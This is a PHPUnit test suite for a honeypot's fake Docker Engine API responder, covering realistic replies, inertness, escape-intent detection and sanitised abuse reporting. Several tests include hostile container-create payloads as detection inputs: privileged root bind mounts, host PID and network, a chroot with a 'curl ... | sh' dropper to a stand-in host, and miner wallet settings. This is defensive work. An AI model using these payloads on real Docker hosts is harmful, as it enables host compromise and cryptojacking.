<?php

declare(strict_types=1);

namespace Funnypot\Tests\App\Docker;

use Funnypot\App\AiApi\StreamEmitter;
use Funnypot\App\Docker\DockerApiResponder;
use Funnypot\App\Docker\PhantomStore;
use Funnypot\App\Storage\SqliteHitStore;
use Funnypot\App\ThreatIntel\AbuseIpdb;
use Funnypot\App\ThreatIntel\ThreatIntelReporter;
use Funnypot\Core\RequestContext;
use PHPUnit\Framework\TestCase;
use stdClass;

/**
 * The Docker responder end to end with temp sqlite stores and a sink-backed emit (no real headers):
 * the realistic create → pull → create → start → inspect → logs → wait → exec engagement, the
 * escape-intent capture, the recon-vs-intent report policy, and — paramount — 100% inertness: nothing
 * is ever run, and the "pull" never contacts the named registry.
 */
final class DockerApiResponderTest extends TestCase
{
    private const IP = '9.9.9.9';        // public/routable, so AbuseIPDB queues it
    private const IP2 = '8.8.4.4';
    private const SEED = 7;
    private const REGISTRY_TOKEN_KEY = 'docker-responder-test-registry-token-key';
    private const NOW = 1_700_000_000;

    /** @var string[] */
    private array $tmp = [];
    private ?SqliteHitStore $store = null;
    private ?AbuseIpdb $abuse = null;
    private ?ThreatIntelReporter $ti = null;
    private ?PhantomStore $phantoms = null;
    private string $intelDb = '';
    private string $logPath = '';
    private stdClass $cap;
    private ?StreamEmitter $stream = null;
    /** @var array{http:bool,https:bool} */
    private array $unregistered = ['http' => false, 'https' => false];

    protected function setUp(): void
    {
        if (!extension_loaded('pdo_sqlite')) {
            self::markTestSkipped('ext-pdo_sqlite not loaded');
        }
        $this->cap = new stdClass();
        $this->cap->status = 0;
        $this->cap->headers = [];
        $this->cap->body = '';

        // Never-execute belt: pull the http/https stream wrappers so any accidental outbound fetch
        // (a "helpful" registry resolution) throws loudly instead of silently succeeding.
        foreach (['http', 'https'] as $w) {
            if (in_array($w, stream_get_wrappers(), true)) {
                $this->unregistered[$w] = @stream_wrapper_unregister($w);
            }
        }
    }

    protected function tearDown(): void
    {
        foreach ($this->unregistered as $w => $was) {
            if ($was) {
                @stream_wrapper_restore($w);
            }
        }
        foreach ($this->tmp as $f) {
            foreach (['', '-wal', '-shm'] as $s) {
                @unlink($f . $s);
            }
        }
        $this->tmp = [];
    }

    private function dbPath(string $n): string
    {
        $p = sys_get_temp_dir() . "/fpdock_{$n}_" . bin2hex(random_bytes(6)) . '.sqlite';
        $this->tmp[] = $p;

        return $p;
    }

    private function make(): DockerApiResponder
    {
        $this->logPath = $this->dbPath('export') . '.log';
        $this->store = new SqliteHitStore($this->dbPath('hits'), $this->logPath);
        $this->intelDb = $this->dbPath('intel');
        $this->abuse = new AbuseIpdb('testkey', $this->intelDb, ['10.0.0.1']);
        $this->ti = new ThreatIntelReporter('https://ti.example', 'tikey', $this->intelDb, ['10.0.0.1']);
        $this->phantoms = new PhantomStore($this->dbPath('docker'), self::SEED, static fn (): int => self::NOW);
        $cap = $this->cap;

        return new DockerApiResponder(
            $this->store,
            self::SEED,
            self::REGISTRY_TOKEN_KEY,
            $this->abuse,
            static fn (): int => self::NOW,
            static function (int $s, array $h, string $b) use ($cap): void {
                $cap->status = $s;
                $cap->headers = $h;
                $cap->body = $b;
            },
            $this->ti,
            $this->phantoms,
            function (): StreamEmitter {
                return $this->stream = new StreamEmitter(static fn (string $b): string => $b, 0);
            },
            0,
        );
    }

    /** @param array<string,mixed>|string|null $body @param array<string,string> $headers */
    private function ctx(string $method, string $path, $body = null, string $query = '', array $headers = []): RequestContext
    {
        $raw = $body === null ? null : (is_string($body) ? $body : (string) json_encode($body));

        return new RequestContext($method, $path, $query, $headers, $raw);
    }

    /** @return array<string,mixed> the last logged row */
    private function lastRow(): array
    {
        $rows = $this->store->delta(0)['rows'];
        self::assertNotEmpty($rows, 'the hit should have been logged');

        return $rows[count($rows) - 1];
    }

    /** @return array<string,mixed> the last JSON-lines export entry (carries the structured intel) */
    private function lastExport(): array
    {
        $lines = array_values(array_filter(explode("\n", (string) file_get_contents($this->logPath))));
        self::assertNotEmpty($lines, 'an export line should have been written');

        return (array) json_decode($lines[count($lines) - 1], true);
    }

    private function lastQueuedComment(): string
    {
        $pdo = new \PDO('sqlite:' . $this->intelDb);
        $pdo->setAttribute(\PDO::ATTR_ERRMODE, \PDO::ERRMODE_EXCEPTION);

        return (string) $pdo->query('SELECT comment FROM abuse_queue ORDER BY id DESC LIMIT 1')->fetchColumn();
    }

    private function lastQueuedCategories(): string
    {
        $pdo = new \PDO('sqlite:' . $this->intelDb);
        $pdo->setAttribute(\PDO::ATTR_ERRMODE, \PDO::ERRMODE_EXCEPTION);

        return (string) $pdo->query('SELECT categories FROM abuse_queue ORDER BY id DESC LIMIT 1')->fetchColumn();
    }

    /** @return array<string,mixed> the last threat-intel queued row (signals decoded) */
    private function lastTiRow(): array
    {
        $pdo = new \PDO('sqlite:' . $this->intelDb);
        $pdo->setAttribute(\PDO::ATTR_ERRMODE, \PDO::ERRMODE_EXCEPTION);
        $row = (array) $pdo->query('SELECT * FROM ti_queue ORDER BY id DESC LIMIT 1')->fetch(\PDO::FETCH_ASSOC);
        $row['signals_decoded'] = json_decode((string) ($row['signals'] ?? ''), true);

        return $row;
    }

    // ---- recon reads still work ----

    public function test_ping_returns_ok_and_is_recon_medium_not_reported(): void
    {
        $this->make()->respond($this->ctx('GET', '/_ping'), self::IP);

        self::assertSame(200, $this->cap->status);
        self::assertSame('OK', $this->cap->body);
        self::assertSame('1.43', $this->cap->headers['Api-Version']);
        self::assertArrayNotHasKey('X-Powered-By', $this->cap->headers);
        self::assertSame('medium', $this->lastRow()['severity']);
        self::assertSame(0, $this->abuse->queueCount(), 'recon never reports');
    }

    public function test_version_and_info_headers_agree_and_are_recon(): void
    {
        $r = $this->make();
        $r->respond($this->ctx('GET', '/v1.24/version'), self::IP);
        $v = json_decode($this->cap->body, true);
        self::assertSame('24.0.5', $v['Version']);
        self::assertSame('1.43', $v['ApiVersion']);

        $r->respond($this->ctx('GET', '/info'), self::IP);
        $info = json_decode($this->cap->body, true);
        self::assertSame(5, $info['ContainersRunning']);
        self::assertSame(7, $info['Images'], 'Images equals the /images/json length, not a random count');
        self::assertSame('medium', $this->lastRow()['severity']);
    }

    public function test_hit_is_labelled_docker_and_shows_on_the_feed(): void
    {
        $this->make()->respond($this->ctx('GET', '/version'), self::IP);

        $row = $this->lastRow();
        self::assertTrue((bool) $row['matched']);
        self::assertTrue((bool) $row['served']);
        self::assertSame('docker', $row['event']);
        self::assertContains('payload-docker_recon', (array) $row['templates']);
    }

    // ---- AC1: non-local create 404 -> pull -> create -> start -> inspect -> logs -> wait -> exec ----

    public function test_full_realistic_engagement_flow(): void
    {
        $r = $this->make();

        // 1. create for a non-local image -> 404 No such image
        $r->respond($this->ctx('POST', '/v1.43/containers/create', ['Image' => 'alpine', 'Cmd' => ['sh']]), self::IP);
        self::assertSame(404, $this->cap->status);
        self::assertSame('application/json', $this->cap->headers['Content-Type']);
        self::assertSame('1.43', $this->cap->headers['Api-Version']);
        self::assertSame('No such image: alpine:latest', json_decode($this->cap->body, true)['message']);
        self::assertSame('docker', $this->lastRow()['event']);

        // 2. the induced pull streams success (never contacts a registry)
        $r->respond($this->ctx('POST', '/v1.43/images/create', null, 'fromImage=alpine&tag=latest'), self::IP);
        self::assertNotNull($this->stream);
        self::assertSame(200, $this->stream->status());
        $objs = array_values(array_filter(explode("\n", $this->stream->captured())));
        self::assertGreaterThanOrEqual(6, count($objs));
        self::assertLessThanOrEqual(40, count($objs));
        self::assertLessThan(8192, strlen($this->stream->captured()));
        self::assertSame('Pulling from library/alpine', json_decode($objs[0], true)['status']);
        self::assertSame('Status: Downloaded newer image for alpine:latest', json_decode($objs[count($objs) - 1], true)['status']);
        self::assertStringContainsString('Digest: sha256:', $this->stream->captured());
        self::assertStringContainsString('fromImage=alpine', (string) $this->lastRow()['path']);

        // 3. same create now succeeds (image is pulled)
        $r->respond($this->ctx('POST', '/v1.43/containers/create', [
            'Image' => 'alpine',
            'Cmd' => ['sh'],
            'HostConfig' => ['Binds' => ['/:/host'], 'Privileged' => true],
        ], 'name=sysupdate'), self::IP);
        self::assertSame(201, $this->cap->status);
        $created = json_decode($this->cap->body, true);
        self::assertMatchesRegularExpression('/^[0-9a-f]{64}$/', $created['Id']);
        $id = $created['Id'];

        // 4. start: 204 first, 304 second
        $r->respond($this->ctx('POST', "/containers/{$id}/start"), self::IP);
        self::assertSame(204, $this->cap->status);
        $r->respond($this->ctx('POST', "/containers/{$id}/start"), self::IP);
        self::assertSame(304, $this->cap->status);

        // 5. inspect echoes the attacker's own config
        $r->respond($this->ctx('GET', "/containers/{$id}/json"), self::IP);
        self::assertSame(200, $this->cap->status);
        $insp = json_decode($this->cap->body, true);
        self::assertTrue($insp['State']['Running']);
        self::assertSame('alpine', $insp['Config']['Image']);
        self::assertTrue($insp['HostConfig']['Privileged']);
        self::assertSame(['/:/host'], $insp['HostConfig']['Binds']);
        self::assertSame('/sysupdate', $insp['Name']);

        // 6. containers/json: 6 rows for this IP, 5 for a different IP
        $r->respond($this->ctx('GET', '/containers/json'), self::IP);
        $rows = json_decode($this->cap->body, true);
        self::assertCount(6, $rows);
        self::assertContains($id, array_column($rows, 'Id'));
        $r->respond($this->ctx('GET', '/containers/json'), self::IP2);
        self::assertCount(5, json_decode($this->cap->body, true), 'the phantom is invisible to another IP');

        // 7. /info counts fold in the phantom for this IP only
        $r->respond($this->ctx('GET', '/info'), self::IP);
        $info = json_decode($this->cap->body, true);
        self::assertSame(6, $info['Containers']);
        self::assertSame(8, $info['Images']);
        $r->respond($this->ctx('GET', '/info'), self::IP2);
        self::assertSame(5, json_decode($this->cap->body, true)['Containers']);

        // 8. logs: empty multiplexed stream (started, no output)
        $r->respond($this->ctx('GET', "/containers/{$id}/logs", null, 'stdout=1&stderr=1'), self::IP);
        self::assertSame(200, $this->cap->status);
        self::assertSame('application/vnd.docker.multiplexed-stream', $this->cap->headers['Content-Type']);
        self::assertSame('', $this->cap->body);

        // 9. wait returns immediately
        $t0 = microtime(true);
        $r->respond($this->ctx('POST', "/containers/{$id}/wait"), self::IP);
        self::assertLessThan(0.5, microtime(true) - $t0);
        self::assertSame(['StatusCode' => 0, 'Error' => null], json_decode($this->cap->body, true));

        // 10. exec captures the second command landing
        $r->respond($this->ctx('POST', "/containers/{$id}/exec", ['Cmd' => ['sh', '-c', 'id']]), self::IP);
        self::assertSame(201, $this->cap->status);
        $eid = json_decode($this->cap->body, true)['Id'];
        self::assertMatchesRegularExpression('/^[0-9a-f]{64}$/', $eid);
        self::assertSame(['sh', '-c', 'id'], $this->lastExport()['docker']['cmd']);
        $r->respond($this->ctx('POST', "/exec/{$eid}/start"), self::IP);
        self::assertSame(200, $this->cap->status);
        self::assertSame('', $this->cap->body);
    }

    public function test_fleet_image_create_is_local_and_needs_no_pull(): void
    {
        $this->make()->respond($this->ctx('POST', '/containers/create', ['Image' => 'postgres:15.4']), self::IP);

        self::assertSame(201, $this->cap->status);
        self::assertMatchesRegularExpression('/^[0-9a-f]{64}$/', json_decode($this->cap->body, true)['Id']);
    }

    public function test_name_conflict_on_a_local_image_is_409_with_by_container_id(): void
    {
        // A local image + a --name colliding with a fleet container: 409 with real dockerd wording,
        // including `by container "<full-id>"` (review A #2).
        $this->make()->respond($this->ctx('POST', '/containers/create', ['Image' => 'postgres:15.4'], 'name=vault-secret-store'), self::IP);

        self::assertSame(409, $this->cap->status);
        $msg = json_decode($this->cap->body, true)['message'];
        self::assertStringContainsString('The container name "/vault-secret-store" is already in use by container "', $msg);
        self::assertMatchesRegularExpression('/by container "[0-9a-f]{64}"/', $msg);
        self::assertStringContainsString('You have to remove (or rename)', $msg);
    }

    public function test_missing_image_404s_before_the_name_conflict(): void
    {
        // Order matches real moby (GetImage before reserveName): a NON-local image + a taken name
        // returns the 404 first, so the pull is still induced even when --name collides (review A #3).
        $this->make()->respond($this->ctx('POST', '/containers/create', ['Image' => 'alpine'], 'name=vault-secret-store'), self::IP);

        self::assertSame(404, $this->cap->status);
        self::assertSame('No such image: alpine:latest', json_decode($this->cap->body, true)['message']);
    }

    public function test_unknown_container_start_is_404_json(): void
    {
        $this->make()->respond($this->ctx('POST', '/containers/deadbeefcafe/start'), self::IP);

        self::assertSame(404, $this->cap->status);
        self::assertSame('No such container: deadbeefcafe', json_decode($this->cap->body, true)['message']);
    }

    public function test_pull_never_contacts_the_registry_even_for_an_invalid_host(): void
    {
        // A .invalid TLD can never resolve; the pull must still "succeed" purely from the seed. If any
        // code path tried an outbound fetch, the unregistered http/https wrappers (setUp) would throw.
        $this->make()->respond($this->ctx('POST', '/images/create', null, 'fromImage=miner.invalid:5000/x/xmrig&tag=latest'), self::IP);

        self::assertNotNull($this->stream);
        self::assertSame(200, $this->stream->status());
        self::assertStringContainsString('Status: Downloaded newer image for', $this->stream->captured());
    }

    public function test_pull_stream_is_byte_stable_for_seed_and_ref(): void
    {
        $r = $this->make();
        $r->respond($this->ctx('POST', '/images/create', null, 'fromImage=alpine'), self::IP);
        $a = $this->stream->captured();
        $r->respond($this->ctx('POST', '/images/create', null, 'fromImage=alpine'), self::IP);
        $b = $this->stream->captured();
        $r->respond($this->ctx('POST', '/images/create', null, 'fromImage=nginx'), self::IP);
        $c = $this->stream->captured();

        self::assertSame($a, $b, 'same seed + ref => identical stream');
        self::assertNotSame($a, $c, 'a different ref differs (different digest/layers)');
    }

    public function test_phantom_evaporates_after_ttl(): void
    {
        // A short TTL + a clock we advance past it.
        $now = self::NOW;
        $clock = static function () use (&$now): int {
            return $now;
        };
        $this->logPath = $this->dbPath('export') . '.log';
        $this->store = new SqliteHitStore($this->dbPath('hits'), $this->logPath);
        $this->intelDb = $this->dbPath('intel');
        $this->abuse = new AbuseIpdb('testkey', $this->intelDb, ['10.0.0.1']);
        $this->phantoms = new PhantomStore($this->dbPath('docker'), self::SEED, $clock, 3600);
        $cap = $this->cap;
        $r = new DockerApiResponder(
            $this->store,
            self::SEED,
            self::REGISTRY_TOKEN_KEY,
            $this->abuse,
            $clock,
            static function (int $s, array $h, string $b) use ($cap): void {
                $cap->status = $s;
                $cap->headers = $h;
                $cap->body = $b;
            },
            null,
            $this->phantoms,
            fn (): StreamEmitter => $this->stream = new StreamEmitter(static fn (string $b): string => $b, 0),
            0,
        );

        $r->respond($this->ctx('POST', '/containers/create', ['Image' => 'postgres:15.4']), self::IP);
        $id = json_decode($this->cap->body, true)['Id'];
        $r->respond($this->ctx('GET', "/containers/{$id}/json"), self::IP);
        self::assertSame(200, $this->cap->status, 'phantom present before TTL');

        $now += 3601;   // advance past the TTL
        $r->respond($this->ctx('GET', "/containers/{$id}/json"), self::IP);
        self::assertSame(404, $this->cap->status, 'phantom evaporated after TTL');
        $r->respond($this->ctx('GET', '/containers/json'), self::IP);
        self::assertCount(5, json_decode($this->cap->body, true));
    }

    // ---- AC2: escape-intent capture ----

    public function test_escape_create_is_logged_structured_and_not_truncated(): void
    {
        // A >300 B body so the old pre-truncation would have dropped the HostConfig escape tail.
        $pad = str_repeat('A', 1200);
        $r = $this->make();
        $r->respond($this->ctx('POST', '/containers/create', [
            'Image' => 'alpine',
            'Cmd' => ['chroot', '/host', 'sh', '-c', 'curl -s http://x/a.sh|sh # ' . $pad],
            'Env' => ['POOL=stratum+tcp://p:3333', 'WALLET=44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A'],
            'HostConfig' => ['Binds' => ['/:/host'], 'Privileged' => true, 'PidMode' => 'host', 'NetworkMode' => 'host', 'CapAdd' => ['SYS_ADMIN'], 'SecurityOpt' => ['seccomp=unconfined']],
        ], 'name=sysupdate'), self::IP);

        $row = $this->lastRow();
        self::assertSame('docker', $row['event']);
        self::assertSame('critical', $row['severity']);
        self::assertStringContainsString('PidMode', (string) $row['body']);
        self::assertStringContainsString('SecurityOpt', (string) $row['body'], 'the HostConfig tail survives (no 300 B truncation)');
        self::assertContains('payload-docker_escape', (array) $row['templates']);
        self::assertContains('docker-privileged', (array) $row['templates']);

        $export = $this->lastExport()['docker'];
        self::assertSame('docker_escape', $export['class']);
        self::assertSame(['/:/host'], $export['binds']);
        self::assertTrue($export['privileged']);
        self::assertSame('host', $export['pid_mode']);
        self::assertContains('bind-root', $export['signals']);
        self::assertContains('pid-host', $export['signals']);
        self::assertContains('net-host', $export['signals']);
        self::assertContains('cap-sys-admin', $export['signals']);
        self::assertContains('seccomp-unconfined', $export['signals']);
        self::assertContains('chroot-host', $export['signals']);
        self::assertContains('miner', $export['signals']);
        self::assertContains('dropper', $export['signals']);
    }

    public function test_registry_auth_password_is_never_stored_in_clear(): void
    {
        $secret = 'Pa55-Zz-DISTINCTIVE';
        $auth = base64_encode((string) json_encode([
            'username' => 'attacker', 'password' => $secret, 'serveraddress' => 'https://index.docker.io/v1/',
        ]));
        $this->make()->respond($this->ctx('POST', '/images/create', null, 'fromImage=alpine', ['X-Registry-Auth' => $auth]), self::IP);

        $export = $this->lastExport()['docker'];
        self::assertSame('attacker', $export['registry_auth']['username']);
        self::assertMatchesRegularExpression('/^[0-9a-f]{32}$/', $export['registry_auth']['pw_token']); // 128 bits retained
        self::assertStringNotContainsString($secret, (string) json_encode($this->lastExport()), 'the cleartext password must never be stored');
    }

    public function test_caps_hold_under_a_hostile_body(): void
    {
        $env = [];
        for ($i = 0; $i < 5000; $i++) {
            $env[] = "K{$i}=" . str_repeat('v', 40);
        }
        $this->make()->respond($this->ctx('POST', '/containers/create', [
            'Image' => 'alpine', 'Cmd' => [str_repeat('x', 10000)], 'Env' => $env,
            'HostConfig' => ['Binds' => array_fill(0, 100, '/a:/b')],
        ]), self::IP);

        $export = $this->lastExport()['docker'];
        self::assertLessThanOrEqual(32, count($export['env']));
        self::assertLessThanOrEqual(16, count($export['binds']));
        self::assertLessThan(20000, strlen((string) json_encode($export)));
    }

    public function test_malformed_body_still_succeeds_inertly(): void
    {
        $this->make()->respond(new RequestContext('POST', '/containers/create', '', [], 'not json at all'), self::IP);

        // Empty image -> not local -> 404 (a real daemon 404/400s a create naming no known image).
        self::assertSame(404, $this->cap->status);
        self::assertSame('docker_api', $this->lastExport()['docker']['class']);
        self::assertSame([], $this->lastExport()['docker']['binds']);
    }

    // ---- AC3: inertness / phantom isolation ----

    public function test_created_container_only_appears_for_its_creator_and_is_removable(): void
    {
        $r = $this->make();
        $r->respond($this->ctx('POST', '/containers/create', ['Image' => 'postgres:15.4', 'Cmd' => ['run']]), self::IP);
        $id = json_decode($this->cap->body, true)['Id'];
        $r->respond($this->ctx('POST', "/containers/{$id}/start"), self::IP);

        // visible + running for the creator (all=1 not needed once started)
        $r->respond($this->ctx('GET', '/containers/json'), self::IP);
        self::assertContains($id, array_column(json_decode($this->cap->body, true), 'Id'));
        // seeded Pid, not a real process id
        $r->respond($this->ctx('GET', "/containers/{$id}/json"), self::IP);
        self::assertIsInt(json_decode($this->cap->body, true)['State']['Pid']);

        // gone after force-remove
        $r->respond($this->ctx('DELETE', "/containers/{$id}", null, 'force=1'), self::IP);
        self::assertSame(204, $this->cap->status);
        $r->respond($this->ctx('GET', '/containers/json'), self::IP);
        self::assertNotContains($id, array_column(json_decode($this->cap->body, true), 'Id'));
    }

    public function test_created_but_not_started_is_hidden_unless_all(): void
    {
        $r = $this->make();
        $r->respond($this->ctx('POST', '/containers/create', ['Image' => 'postgres:15.4']), self::IP);

        $r->respond($this->ctx('GET', '/containers/json'), self::IP);
        self::assertCount(5, json_decode($this->cap->body, true), 'a created-but-not-started phantom is hidden');
        $r->respond($this->ctx('GET', '/containers/json', null, 'all=1'), self::IP);
        self::assertCount(6, json_decode($this->cap->body, true), '?all=1 reveals it');
        // it counts toward Containers but not ContainersRunning
        $r->respond($this->ctx('GET', '/info'), self::IP);
        $info = json_decode($this->cap->body, true);
        self::assertSame(6, $info['Containers']);
        self::assertSame(5, $info['ContainersRunning']);
    }

    public function test_delete_running_fleet_is_409_with_exact_text(): void
    {
        $r = $this->make();
        $r->respond($this->ctx('DELETE', '/containers/vault-secret-store'), self::IP);
        self::assertSame(409, $this->cap->status);
        self::assertStringContainsString('You cannot remove a running container', json_decode($this->cap->body, true)['message']);
        self::assertStringContainsString('Stop the container before attempting removal or force remove', json_decode($this->cap->body, true)['message']);
    }

    public function test_kill_created_phantom_is_409_not_running(): void
    {
        $r = $this->make();
        $r->respond($this->ctx('POST', '/containers/create', ['Image' => 'postgres:15.4']), self::IP);
        $id = json_decode($this->cap->body, true)['Id'];
        $r->respond($this->ctx('POST', "/containers/{$id}/kill"), self::IP);
        self::assertSame(409, $this->cap->status);
        self::assertStringContainsString('is not running', json_decode($this->cap->body, true)['message']);
    }

    public function test_two_responders_same_seed_read_as_one_host(): void
    {
        // build two independent responders on the SAME seed
        $r1 = $this->make();
        $r1->respond($this->ctx('GET', '/version'), self::IP);
        $v1 = $this->cap->body;
        $r2 = $this->make();
        $r2->respond($this->ctx('GET', '/version'), self::IP);
        self::assertSame($v1, $this->cap->body, 'two deploys of the same seed present one coherent daemon');
    }

    // ---- report policy (recon silent, intent once, sanitised) ----

    public function test_recon_get_is_logged_but_not_reported(): void
    {
        $this->make()->respond($this->ctx('GET', '/version'), self::IP);
        self::assertSame(0, $this->abuse->queueCount());
        self::assertSame('medium', $this->lastRow()['severity']);
    }

    public function test_dedup_no_longer_eats_the_create(): void
    {
        $r = $this->make();
        $r->respond($this->ctx('GET', '/_ping'), self::IP);
        $r->respond($this->ctx('GET', '/version'), self::IP);
        $r->respond($this->ctx('GET', '/info'), self::IP);
        self::assertSame(0, $this->abuse->queueCount(), 'recon burned no dedup slot');

        $r->respond($this->ctx('POST', '/containers/create', [
            'Image' => 'alpine', 'HostConfig' => ['Binds' => ['/:/host'], 'Privileged' => true, 'PidMode' => 'host'],
        ]), self::IP);
        self::assertSame(1, $this->abuse->queueCount(), 'the escape create is the report that goes out');
        self::assertStringContainsString('docker_escape container-create [', $this->lastQueuedComment());
    }

    public function test_escape_create_reports_once_with_class_prefix_and_sanitised_detail(): void
    {
        $wallet = '44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A';
        $this->make()->respond($this->ctx('POST', '/containers/create', [
            'Image' => 'alpine',
            'Cmd' => ['sh', '-c', 'miner'],
            'Env' => ['WALLET=' . $wallet],
            'HostConfig' => ['Binds' => ['/:/host'], 'Privileged' => true, 'PidMode' => 'host'],
        ], 'name=sysupdate'), self::IP);

        self::assertSame(1, $this->abuse->queueCount());
        $comment = $this->lastQueuedComment();
        self::assertStringStartsWith('docker_escape container-create [', $comment);
        self::assertStringContainsString('bind-root', $comment);
        self::assertStringContainsString('privileged', $comment);
        self::assertStringContainsString('image=alpine:latest', $comment);
        self::assertStringNotContainsString($wallet, $comment, 'the env wallet must never enter the public comment');
        self::assertStringNotContainsString('sysupdate', $comment, 'the container name is not published');
        self::assertSame('15,21', $this->lastQueuedCategories());
    }

    public function test_queued_comment_sanitises_secret_but_keeps_registry_host(): void
    {
        $this->make()->respond($this->ctx('POST', '/containers/create', [
            'Image' => 'evil-registry.example/miner:latest?access_token=SECRETXYZ',
        ]), self::IP);

        self::assertSame(1, $this->abuse->queueCount());
        $comment = $this->lastQueuedComment();
        self::assertStringNotContainsString('SECRETXYZ', $comment);
        self::assertStringContainsString('[redacted]', $comment);
        self::assertStringContainsString('evil-registry.example', $comment);
    }

    public function test_threatintel_receives_structured_signals_and_confidence(): void
    {
        $this->make()->respond($this->ctx('POST', '/containers/create', [
            'Image' => 'alpine',
            'HostConfig' => ['Binds' => ['/:/host'], 'Privileged' => true, 'PidMode' => 'host'],
        ]), self::IP);

        $row = $this->lastTiRow();
        self::assertEqualsWithDelta(0.95, (float) $row['confidence'], 0.001);
        $sig = $row['signals_decoded'];
        self::assertSame('docker_escape', $sig['class']);
        self::assertContains('bind-root', $sig['signals']);
        self::assertSame(['/:/host'], $sig['binds']);
        self::assertSame('docker.io', $sig['image_ref']['registry']);
    }
}
